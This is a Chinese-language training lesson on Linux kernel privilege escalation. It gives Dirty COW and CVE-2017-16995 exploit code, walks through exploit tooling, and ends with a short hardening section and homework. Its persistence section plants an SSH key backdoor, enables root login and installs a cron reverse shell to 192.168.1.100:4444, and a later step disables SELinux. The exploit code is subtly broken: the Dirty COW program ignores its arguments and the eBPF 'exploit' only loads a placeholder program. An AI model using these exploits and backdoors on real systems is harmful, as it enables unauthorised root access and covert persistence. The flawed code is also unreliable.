# 课时01 Linux内核漏洞提权

## 一、课程目标

本节课主要学习Linux系统中利用内核漏洞进行提权的技术和方法。内核漏洞提权是权限提升中最有效但也最具挑战性的方法之一。通过本课的学习，你将能够：

1. 理解Linux内核漏洞提权的基本原理
2. 掌握常见的Linux内核漏洞类型和利用方法
3. 学会使用现有的提权工具和exp
4. 了解内核漏洞提权的防护措施
5. 熟悉提权后的权限维持技术

## 二、名词解释表

| 名词 | 解释 |
|------|------|
| 内核漏洞 | Linux内核中存在的安全缺陷 |
| 提权 | 提升当前用户的权限级别 |
| Root权限 | Linux系统中的最高权限 |
| CVE编号 | Common Vulnerabilities and Exposures编号 |
| Exploit | 利用漏洞的代码或工具 |
| 本地提权 | 在本地系统上进行的权限提升 |
| 内核模块 | 可加载到内核中的功能模块 |
| KASLR | Kernel Address Space Layout Randomization |

## 三、技术原理

### 3.1 内核漏洞概述

Linux内核漏洞是指Linux操作系统内核中存在的安全缺陷，攻击者可以利用这些漏洞从普通用户权限提升到root权限。

#### 内核漏洞类型
1. **缓冲区溢出**：内核代码中的缓冲区溢出漏洞
2. **竞态条件**：多线程或多进程间的竞争条件漏洞
3. **空指针解引用**：访问空指针导致的内核崩溃
4. **整数溢出**：整数运算溢出导致的内存破坏
5. **UAF漏洞**：Use After Free内存释放后使用漏洞

### 3.2 提权原理

#### 内核态与用户态
- **用户态**：普通进程运行的模式，权限受限
- **内核态**：内核运行的模式，拥有最高权限

#### 提权过程
1. 利用内核漏洞触发内核态执行
2. 在内核态中修改进程权限信息
3. 返回用户态后获得提升的权限

### 3.3 常见漏洞利用技术

#### ROP技术
```c
// ROP (Return Oriented Programming)示例
// 通过链接现有代码片段构造执行流
unsigned long rop_chain[] = {
    kernel_base + 0x12345,  // gadget 1
    kernel_base + 0x67890,  // gadget 2
    // ... 更多gadgets
};
```

#### KASLR绕过
```bash
# 检查KASLR是否启用
cat /proc/cmdline | grep kaslr

# 收集内核信息绕过KASLR
cat /proc/kallsyms | grep prepare_kernel_cred
```

## 四、常见内核漏洞

### 4.1 CVE-2016-5195 (Dirty COW)

#### 漏洞原理
Dirty COW (Copy-On-Write)是一个竞争条件漏洞，存在于Linux内核的内存子系统中。

#### 影响范围
- Linux内核版本 2.6.22 到 4.8.3
- 几乎所有Linux发行版都受影响

#### 利用代码示例
```c
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    int i, c = 0;
    for (i = 0; i < 2000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("madvise %d\n\n", c);
}

void *procselfmemThread(void *arg) {
    char *str = "root:x:0:0:root:/root:/bin/bash\n";
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for (i = 0; i < 2000000; i++) {
        lseek(f, (uintptr_t) map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
    printf("procselfmem %d\n\n", c);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <file> <new_content>\n", argv[0]);
        return 1;
    }
    
    pthread_t pth1, pth2;
    
    f = open("/etc/passwd", O_RDONLY);
    fstat(f, &st);
    name = argv[1];
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    
    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, procselfmemThread, NULL);
    
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    
    return 0;
}
```

### 4.2 CVE-2017-16995

#### 漏洞原理
这是一个eBPF验证器中的漏洞，可以导致任意代码执行。

#### 利用示例
```c
// 简化的eBPF利用代码
#include <linux/bpf.h>
#include <unistd.h>
#include <sys/syscall.h>

#define BPF_JMP32 0x06
#define BPF_K 0x00

struct bpf_insn insns[] = {
    // 构造恶意的eBPF程序
    {BPF_JMP32 | BPF_K, 0, 0, 0xffffffff},
    // ... 更多指令
};

int main() {
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = sizeof(insns) / sizeof(insns[0]),
        .insns = (__u64) insns,
        .license = (__u64) "GPL",
    };
    
    int fd = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    if (fd < 0) {
        perror("bpf");
        return 1;
    }
    
    printf("eBPF program loaded successfully\n");
    close(fd);
    return 0;
}
```

## 五、提权工具使用

### 5.1 Linux Exploit Suggester

#### 工具介绍
Linux Exploit Suggester是一个自动化工具，可以根据内核版本推荐合适的提权exp。

#### 使用方法
```bash
# 下载工具
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# 添加执行权限
chmod +x linux-exploit-suggester.sh

# 运行工具
./linux-exploit-suggester.sh

# 指定内核版本
./linux-exploit-suggester.sh -k 4.4.0-21-generic
```

#### 输出示例
```
Available information:
Kernel version: 4.4.0-21-generic
Architecture: x86_64
Distribution: ubuntu

May be vulnerable to:
[+] CVE-2016-5195  (Dirty COW)
[+] CVE-2017-1000364  (Stack Clash)
[+] CVE-2017-16995  (eBPF Verifier)
```

### 5.2 BeRoot

#### 工具介绍
BeRoot是一个全面的提权检查工具，支持Windows和Linux系统。

#### 使用方法
```bash
# 下载BeRoot
git clone https://github.com/AlessandroZ/BeRoot.git

# 运行Linux版本
python beroot.py --help

# 检查系统配置
python beroot.py --check
```

### 5.3 LinEnum

#### 工具介绍
LinEnum是一个bash脚本，用于枚举Linux系统信息并寻找提权机会。

#### 使用方法
```bash
# 下载LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# 添加执行权限
chmod +x LinEnum.sh

# 运行扫描
./LinEnum.sh -t -s -r report.txt
```

## 六、手工提权方法

### 6.1 内核版本识别

```bash
# 查看内核版本
uname -a
uname -r

# 查看发行版信息
cat /etc/os-release
cat /etc/issue

# 查看系统架构
uname -m
getconf LONG_BIT
```

### 6.2 编译环境检查

```bash
# 检查GCC版本
gcc --version

# 检查make工具
make --version

# 检查编译依赖
dpkg -l | grep build-essential  # Debian/Ubuntu
rpm -qa | grep gcc              # CentOS/RHEL
```

### 6.3 漏洞利用编译

```bash
# 编译Dirty COW exp
gcc -pthread dirtycow.c -o dirtycow

# 编译时指定架构
gcc -m32 -pthread dirtycow.c -o dirtycow32

# 静态编译避免依赖问题
gcc -static -pthread dirtycow.c -o dirtycow_static
```

## 七、权限维持

### 7.1 Rootkit检测

#### 检查隐藏进程
```bash
# 使用chkproc检查隐藏进程
ps aux | sort -k2 -n | uniq -f1 -d

# 检查/proc目录
ls /proc | grep -E '^[0-9]+$'
```

#### 检查隐藏文件
```bash
# 检查隐藏文件
find / -name ".*" -type f 2>/dev/null | grep -v -E '/proc|/sys'

# 检查SUID文件
find / -perm -4000 2>/dev/null
```

### 7.2 后门植入

#### SSH后门
```bash
# 添加SSH公钥
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 修改SSH配置
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
```

#### Cron后门
```bash
# 添加定时任务后门
echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'" | crontab -
```

## 八、防护措施

### 8.1 内核安全配置

#### 启用KASLR
```bash
# 检查KASLR状态
cat /proc/cmdline | grep kaslr

# 在GRUB中启用KASLR
# 编辑/etc/default/grub
GRUB_CMDLINE_LINUX="kaslr"
update-grub
```

#### 启用SMEP/SMAP
```bash
# 检查SMEP支持
cat /proc/cpuinfo | grep smep

# 检查SMAP支持
cat /proc/cpuinfo | grep smap
```

### 8.2 系统加固

#### 内核参数调优
```bash
# 编辑/etc/sysctl.conf
kernel.kptr_restrict = 1
kernel.dmesg_restrict = 1
kernel.perf_event_paranoid = 2

# 应用配置
sysctl -p
```

#### 文件系统权限
```bash
# 检查敏感文件权限
ls -la /etc/passwd /etc/shadow /etc/sudoers

# 设置严格权限
chmod 644 /etc/passwd
chmod 640 /etc/shadow
chmod 440 /etc/sudoers
```

## 九、实战案例

### 9.1 Dirty COW提权实战

#### 环境准备
```bash
# 检查内核版本
uname -r
# 输出: 4.4.0-21-generic

# 确认漏洞存在
cat /proc/version
# 确认版本在受影响范围内
```

#### Exploit执行
```bash
# 编译exp
gcc -pthread dirtycow.c -o dirtycow

# 运行exp
./dirtycow /etc/passwd "root2:x:0:0:root:/root:/bin/bash\n"

# 验证提权
su root2
id
# 输出: uid=0(root) gid=0(root) groups=0(root)
```

### 9.2 eBPF漏洞提权

#### 检查漏洞
```bash
# 检查内核版本
uname -r
# 确认版本存在CVE-2017-16995漏洞

# 检查eBPF支持
grep CONFIG_BPF /boot/config-$(uname -r)
```

#### 利用过程
```bash
# 编译并运行exp
gcc ebpf_exploit.c -o ebpf_exploit
./ebpf_exploit

# 验证权限
id
# 检查是否获得root权限
```

## 十、故障排除

### 10.1 编译问题

#### 缺少头文件
```bash
# Ubuntu/Debian
sudo apt-get install linux-headers-$(uname -r) build-essential

# CentOS/RHEL
sudo yum install kernel-devel kernel-headers gcc make
```

#### 架构不匹配
```bash
# 检查目标架构
file exploit_binary

# 编译指定架构
gcc -m32 exploit.c -o exploit32  # 32位
gcc -m64 exploit.c -o exploit64  # 64位
```

### 10.2 执行失败

#### 权限不足
```bash
# 检查文件权限
ls -la exploit

# 添加执行权限
chmod +x exploit
```

#### SELinux阻止
```bash
# 临时禁用SELinux
setenforce 0

# 检查SELinux状态
getenforce
```

## 十一、课后作业

1. **基础练习**：
   - 在实验环境中搭建存在已知漏洞的Linux系统
   - 使用Linux Exploit Suggester识别可利用漏洞
   - 成功执行Dirty COW提权实验
   - 验证提权结果并清理环境

2. **进阶练习**：
   - 分析CVE-2017-16995漏洞原理
   - 编写简单的内核漏洞利用代码
   - 实现权限维持技术
   - 配置系统防护措施

3. **思考题**：
   - 内核漏洞提权相比其他提权方法的优势和劣势是什么？
   - 如何有效防范内核漏洞提权攻击？
   - 现代Linux内核采用了哪些安全机制来防止提权？

4. **扩展阅读**：
   - 研究最新的Linux内核漏洞
   - 了解内核漏洞挖掘技术
   - 学习内核安全防护机制